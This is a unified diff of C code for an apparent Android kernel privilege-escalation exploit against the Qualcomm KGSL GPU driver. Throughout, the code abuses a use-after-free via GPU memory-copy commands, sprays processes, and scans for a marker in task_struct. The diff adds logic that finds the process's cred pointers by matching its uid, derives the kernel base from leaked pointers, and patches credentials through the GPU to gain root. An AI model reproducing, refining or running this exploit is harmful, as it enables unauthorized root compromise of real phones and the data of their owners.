@@ -42,9 +42,9 @@
 #define UAF_START            0x7001FF000ULL
 #define UAF_SIZE             0x10004000ULL
 #define UAF_SCAN_SIZE        0x04000000ULL
-#define SCAN_PAGE_STEP       8U
-#define SCAN_MAX_PAGES       512U
-#define SCAN_PROGRESS_EVERY  64U
+#define SCAN_PAGE_STEP       1U
+#define SCAN_MAX_PAGES       4096U
+#define SCAN_PROGRESS_EVERY  256U
 #define OVERLAP_START        0x7001FE000ULL
 #define OVERLAP_SIZE         0x00007000ULL
 #define PLACEH_START         0x710204000ULL
@@ -93,9 +93,11 @@ static void flush_icache(void *addr, size_t len)
 
 static uint64_t find_kernel_base_from_task_va(uint64_t task_va);
 static uint64_t find_offsets_auto(uint64_t kernel_base);
+static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_data, int comm_off,
+                                       uint64_t *out_cred_ptr, uint64_t *out_real_cred_ptr);
 static uint64_t get_kernel_base(void);
 #define WAIT_STEP_US 1000
-#define WAIT_TIMEOUT_MS 60000
+#define WAIT_TIMEOUT_MS 180000
 
 static int wait_for_flag_u8(volatile uint8_t *ptr, uint8_t value, unsigned int timeout_ms)
 {
@@ -122,10 +124,10 @@ static int wait_for_flag_u64(volatile uint64_t *ptr, uint64_t value, unsigned in
 uint8_t sig_num[] = {1, 3, 5, 7, 9};
 
 #define KGSL_IOC_TYPE 0x09
-#define FINDING 1
-#define SPRAY_COUNT 10000
+#define FINDING 10
+#define SPRAY_COUNT 8000
 #define SPRAY_COUNT_STEP 1000
-#define SPRAY_COUNT_MAX 10000
+#define SPRAY_COUNT_MAX 8000
 #define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
 #define KGSL_USER_MEM_TYPE_ADDR 0x00000002U
 
@@ -1191,16 +1193,36 @@ static void safe_cred_patch(void)
     fprintf(stderr, "[CHILD] Step 2: Patching cred structure via GPU...\n");
     uint8_t task_data[4096];
     if (gpu_read_task_struct(fd, task_va, task_data, 4096) == 0) {
-        // We use the hardcoded offsets for your specific kernel
-        uint64_t cred_ptr = *(uint64_t *)(task_data + OFFSET_CRED);
-        uint64_t real_cred_ptr = *(uint64_t *)(task_data + OFFSET_REAL_CRED);
+        uint64_t cred_ptr = 0, real_cred_ptr = 0;
         
-        fprintf(stderr, "[CHILD] Found cred_ptr=0x%lx real_cred_ptr=0x%lx at offsets 0x%x/0x%x\n", 
-                (unsigned long)cred_ptr, (unsigned long)real_cred_ptr, OFFSET_CRED, OFFSET_REAL_CRED);
+        // Try dynamic search first (more robust for LPDDR5/xddr5)
+        int comm_off = -1;
+        for (int i = 0; i < 4096 - 8; i++) {
+            if (memcmp(task_data + i, MARKER_NAME, 8) == 0) {
+                comm_off = i;
+                break;
+            }
+        }
+        
+        if (comm_off != -1) {
+            if (find_cred_pointers_near_comm(fd, task_va, task_data, comm_off, &cred_ptr, &real_cred_ptr)) {
+                fprintf(stderr, "[CHILD] Dynamic search FOUND cred_ptr=0x%lx\n", (unsigned long)cred_ptr);
+            }
+        }
+        
+        if (cred_ptr == 0) {
+            // Fallback to hardcoded offsets
+            cred_ptr = *(uint64_t *)(task_data + OFFSET_CRED);
+            real_cred_ptr = *(uint64_t *)(task_data + OFFSET_REAL_CRED);
+            fprintf(stderr, "[CHILD] Using hardcoded offsets 0x%x/0x%x -> cred_ptr=0x%lx\n", 
+                    OFFSET_CRED, OFFSET_REAL_CRED, (unsigned long)cred_ptr);
+        }
 
-        if (patch_cred_via_gpu(fd, cred_ptr, real_cred_ptr) == 0) {
-            fprintf(stderr, "[CHILD] [+] Cred patch SUCCESSFUL via GPU!\n");
-            patched = 1;
+        if (cred_ptr != 0 && (cred_ptr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+            if (patch_cred_via_gpu(fd, cred_ptr, real_cred_ptr) == 0) {
+                fprintf(stderr, "[CHILD] [+] Cred patch SUCCESSFUL via GPU!\n");
+                patched = 1;
+            }
         }
     }
 
@@ -1538,12 +1560,52 @@ static int find_marker_in_page(uint8_t *page_data, size_t page_size, uint64_t cu
     return 0;
 }
 
+static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_data, int comm_off,
+                                       uint64_t *out_cred_ptr, uint64_t *out_real_cred_ptr)
+{
+    uid_t my_uid = getuid();
+    int search_start = comm_off - 512;
+    if (search_start < 0) search_start = 0;
+
+    fprintf(stderr, "[CRED_SEARCH] Searching near comm_off 0x%x (my_uid=%d)\n", comm_off, my_uid);
+
+    for (int off = comm_off - 8; off >= search_start; off -= 8)
+    {
+        uint64_t ptr = *(uint64_t *)(task_data + off);
+        if ((ptr & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
+            continue;
+
+        uint8_t cred_check[64];
+        if (gpu_read_task_struct(fd, ptr, cred_check, 64) == 0)
+        {
+            uint32_t usage = *(uint32_t *)(cred_check + 0x00);
+            uint32_t uid = *(uint32_t *)(cred_check + 0x04);
+            uint32_t gid = *(uint32_t *)(cred_check + 0x08);
+
+            if (usage > 0 && usage < 10000 && uid == my_uid)
+            {
+                *out_cred_ptr = ptr;
+                // real_cred is usually right before cred
+                uint64_t ptr2 = *(uint64_t *)(task_data + off - 8);
+                if ((ptr2 & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
+                    *out_real_cred_ptr = ptr2;
+                else
+                    *out_real_cred_ptr = ptr;
+
+                fprintf(stderr, "[CRED_SEARCH] FOUND! off=0x%x, cred=0x%lx, real_cred=0x%lx\n",
+                        off, (unsigned long)*out_cred_ptr, (unsigned long)*out_real_cred_ptr);
+                return 1;
+            }
+        }
+    }
+    return 0;
+}
+
 static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, int *num_found)
 {
     unsigned int ctx_id = 0, ib_id = 0, dst_id = 0;
     uint64_t ib_gpu = 0, dst_gpu = 0;
     void *ib_vma = NULL, *dst_vma = NULL;
-    int found = 0;
     *num_found = 0;
 
     fprintf(stderr, "\n[12] SCANNING UAF (FULL PAGE SCAN - 1024 dwords)\n");
@@ -1609,117 +1671,153 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
     fprintf(stderr, "      [*] Scanning FULL pages for KETO0422 and kernel pointers...\n");
     fflush(stderr);
 
-    uint64_t current_va = UAF_START;
-    uint64_t end_va = UAF_START + UAF_SCAN_SIZE;
-    int pages_scanned = 0;
+    uint64_t uaf_base_offsets[] = {
+        0x0, 0x80, 0x100, 0x180, 0x200, 0x280, 0x300, 0x380,
+        0x400, 0x480, 0x500, 0x580, 0x600, 0x680, 0x700, 0x780,
+        0x800, 0x880, 0x900, 0x980, 0xa00, 0xa80, 0xb00, 0xb80,
+        0xc00, 0xc80, 0xd00, 0xd80, 0xe00, 0xe80, 0xf00, 0xf80};
+    int num_offsets = sizeof(uaf_base_offsets) / sizeof(uaf_base_offsets[0]);
     int marker_found = 0;
+    int pages_scanned = 0;
 
-    while (current_va < end_va && *num_found < MAX_FOUND_PAGES && !marker_found && pages_scanned < SCAN_MAX_PAGES)
+    for (int off_idx = 0; off_idx < num_offsets && !marker_found; off_idx++)
     {
-        uint32_t *cmd = (uint32_t *)ib_vma;
-        memset(ib_vma, 0, ib_alloc.mmapsize);
-        memset(dst_vma, 0, dst_alloc.mmapsize);
-        int dw = 0;
+        uint64_t current_va = UAF_START + uaf_base_offsets[off_idx];
+        uint64_t end_va = UAF_START + UAF_SCAN_SIZE;
+        pages_scanned = 0;
+        
+        fprintf(stderr, "      [*] Scanning with base offset 0x%lx...\n", (unsigned long)uaf_base_offsets[off_idx]);
 
-        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
-
-        for (int i = 0; i < 1024; i++)
+        while (current_va < end_va && *num_found < MAX_FOUND_PAGES && !marker_found && pages_scanned < SCAN_MAX_PAGES)
         {
-            uint32_t d_lo, d_hi, s_lo, s_hi;
-            split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
-            split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);
+            uint32_t *cmd = (uint32_t *)ib_vma;
+            memset(ib_vma, 0, ib_alloc.mmapsize);
+            memset(dst_vma, 0, dst_alloc.mmapsize);
+            int dw = 0;
 
-            cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0x00000000;
-            cmd[dw++] = d_lo;
-            cmd[dw++] = d_hi;
-            cmd[dw++] = s_lo;
-            cmd[dw++] = s_hi;
-        }
+            cmd[dw++] = cp_type7_packet(CP_NOP, 0);
 
-        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
-
-        size_t ib_bytes = (size_t)dw * 4;
-        msync(ib_vma, ib_bytes, MS_SYNC);
-
-        struct kgsl_command_object cmd_obj = {
-            .gpuaddr = ib_gpu,
-            .size = ib_bytes,
-            .flags = KGSL_CMDLIST_IB,
-            .id = ib_id};
-
-        struct kgsl_gpu_command gpu_cmd = {0};
-        gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
-        gpu_cmd.cmdsize = sizeof(cmd_obj);
-        gpu_cmd.numcmds = 1;
-        gpu_cmd.context_id = ctx_id;
-
-        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0)
-        {
-            fprintf(stderr, "\n      [!] GPU command failed at VA 0x%lx\n", (unsigned long)current_va);
-            break;
-        }
-
-        if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0)
-        {
-            fprintf(stderr, "\n      [!] GPU timeout at VA 0x%lx\n", (unsigned long)current_va);
-            break;
-        }
-
-        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
-
-        uint32_t *data = (uint32_t *)dst_vma;
-        uint8_t *bytes = (uint8_t *)dst_vma;
-
-        pages_scanned++;
-        if (pages_scanned % SCAN_PROGRESS_EVERY == 0)
-        {
-            fprintf(stderr, ".");
-            fflush(stderr);
-        }
-
-        pid_t comm_pid = -1;
-        if (find_marker_in_page(bytes, 4096, current_va, &comm_pid))
-        {
-            fprintf(stderr,
-                    "\n      [!!!] FOUND KETO0422 at VA 0x%lx\n",
-                    (unsigned long)current_va);
-            fprintf(stderr, "      [!!!] PARSED PID: %d\n", comm_pid);
-            marker_found = 1;
-
-            if (comm_pid > 0)
+            for (int i = 0; i < 1024; i++)
             {
-                *(uint64_t *)&gbuf[GBUF_TARGET_PID] = comm_pid;
-                *(uint64_t *)&gbuf[GBUF_TASK_VA] = current_va;
+                uint32_t d_lo, d_hi, s_lo, s_hi;
+                split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
+                split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);
 
-                fprintf(stderr, "      [!!!] TARGET PID: %d (saved to gbuf[0x40])\n", comm_pid);
-                fprintf(stderr, "      [!!!] TASK VA: 0x%lx (saved to gbuf[0xb08])\n", (unsigned long)current_va);
-
-                for (int si = 0; si < spray_count; si++)
-                {
-                    if (spray_ctrl[si].pid == comm_pid)
-                    {
-                        spray_ctrl[si].do_action = 1;
-                        fprintf(stderr, "      [!!!] MARKED spray slot %d for PID %d\n", si, comm_pid);
-                        break;
-                    }
-                }
-
-                ensure_pid_in_spray_ctrl(comm_pid);
-
-                if (*num_found < MAX_FOUND_PAGES)
-                {
-                    found_pages[*num_found].va = current_va;
-                    memcpy(found_pages[*num_found].data, data, 4096);
-                    found_pages[*num_found].non_zero_count = 1;
-                    (*num_found)++;
-                }
-
-                goto cleanup;
+                cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0x00000000;
+                cmd[dw++] = d_lo;
+                cmd[dw++] = d_hi;
+                cmd[dw++] = s_lo;
+                cmd[dw++] = s_hi;
             }
-        }
 
-        current_va += PAGE_SIZE * SCAN_PAGE_STEP;
+            cmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+            size_t ib_bytes = (size_t)dw * 4;
+            msync(ib_vma, ib_bytes, MS_SYNC);
+
+            struct kgsl_command_object cmd_obj = {
+                .gpuaddr = ib_gpu,
+                .size = ib_bytes,
+                .flags = KGSL_CMDLIST_IB,
+                .id = ib_id};
+
+            struct kgsl_gpu_command gpu_cmd = {0};
+            gpu_cmd.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
+            gpu_cmd.cmdsize = sizeof(cmd_obj);
+            gpu_cmd.numcmds = 1;
+            gpu_cmd.context_id = ctx_id;
+
+            if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0)
+            {
+                fprintf(stderr, "\n      [!] GPU command failed at VA 0x%lx\n", (unsigned long)current_va);
+                break;
+            }
+
+            if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0)
+            {
+                fprintf(stderr, "\n      [!] GPU timeout at VA 0x%lx\n", (unsigned long)current_va);
+                break;
+            }
+
+            msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
+
+            uint32_t *data = (uint32_t *)dst_vma;
+            uint8_t *bytes = (uint8_t *)dst_vma;
+
+            pages_scanned++;
+            if (pages_scanned % SCAN_PROGRESS_EVERY == 0)
+            {
+                fprintf(stderr, ".");
+                fflush(stderr);
+            }
+
+            pid_t comm_pid = -1;
+            if (find_marker_in_page(bytes, 4096, current_va, &comm_pid))
+            {
+                fprintf(stderr,
+                        "\n      [!!!] FOUND KETO0422 at VA 0x%lx\n",
+                        (unsigned long)current_va);
+                fprintf(stderr, "      [!!!] PARSED PID: %d\n", comm_pid);
+                marker_found = 1;
+
+                if (comm_pid > 0)
+                {
+                    *(uint64_t *)&gbuf[GBUF_TARGET_PID] = comm_pid;
+                    *(uint64_t *)&gbuf[GBUF_TASK_VA] = current_va;
+
+                    fprintf(stderr, "      [!!!] TARGET PID: %d (saved to gbuf[0x40])\n", comm_pid);
+                    fprintf(stderr, "      [!!!] TASK VA: 0x%lx (saved to gbuf[0xb08])\n", (unsigned long)current_va);
+
+                    for (int si = 0; si < spray_count; si++)
+                    {
+                        if (spray_ctrl[si].pid == comm_pid)
+                        {
+                            spray_ctrl[si].do_action = 1;
+                            fprintf(stderr, "      [!!!] MARKED spray slot %d for PID %d\n", si, comm_pid);
+                            break;
+                        }
+                    }
+
+                    ensure_pid_in_spray_ctrl(comm_pid);
+
+                    // Try to find kernel base from the task data (4096 bytes = 512 uint64_t)
+                    for (int i = 0; i < 512; i++)
+                    {
+                        uint64_t ptr = ((uint64_t *)data)[i];
+                        if ((ptr & 0xFFFFFFC000000000ULL) == 0xFFFFFFC000000000ULL)
+                        {
+                            uint64_t base = ptr & 0xFFFFFFFFFFFF0000ULL;
+                            // Search for kernel base by mask
+                            for (int j = 0; j < 0x100; j++)
+                            {
+                                uint64_t candidate = base - (j * 0x10000);
+                                if ((candidate & 0xFFFFFFFFFF000000ULL) == 0xffffffc000000000ULL)
+                                {
+                                    *(uint64_t *)&gbuf[0x20] = candidate;
+                                    fprintf(stderr, "[KBASE] Found candidate base 0x%lx via ptr 0x%lx\n", 
+                                            (unsigned long)candidate, (unsigned long)ptr);
+                                    break;
+                                }
+                            }
+                            if (*(uint64_t *)&gbuf[0x20] != 0) break;
+                        }
+                    }
+
+                    if (*num_found < MAX_FOUND_PAGES)
+                    {
+                        found_pages[*num_found].va = current_va;
+                        memcpy(found_pages[*num_found].data, data, 4096);
+                        found_pages[*num_found].non_zero_count = 1;
+                        (*num_found)++;
+                    }
+
+                    goto cleanup;
+                }
+            }
+
+            current_va += PAGE_SIZE * SCAN_PAGE_STEP;
+        }
     }
 
     fprintf(stderr, "\n      [*] Scan complete: scanned %d pages, found %d candidates\n",
@@ -2564,7 +2662,7 @@ restart:;
     fprintf(stderr, "\n[12] Scanning UAF region for non-zero data\n");
     fprintf(stderr, "    [*] Looking for KETO0422 marker and kernel pointers...\n");
 
-    struct nonzero_page found_pages[FINDING];
+    struct nonzero_page *found_pages = calloc(FINDING, sizeof(struct nonzero_page));
     int num_found = 0;
 
     if (scan_uaf_for_nonzero_multi(fd, found_pages, &num_found))
@@ -2576,9 +2674,11 @@ restart:;
             fprintf(stderr, "    [*] First found VA: 0x%lx\n",
                     (unsigned long)found_pages[0].va);
         }
+        free(found_pages);
     }
     else
     {
+        free(found_pages);
         fprintf(stderr, "\n    [!] scan_uaf_for_nonzero_multi failed. Cleaning up and restarting...\n");
 
         fprintf(stderr, "[CLEANUP] Killing all spray processes...\n");
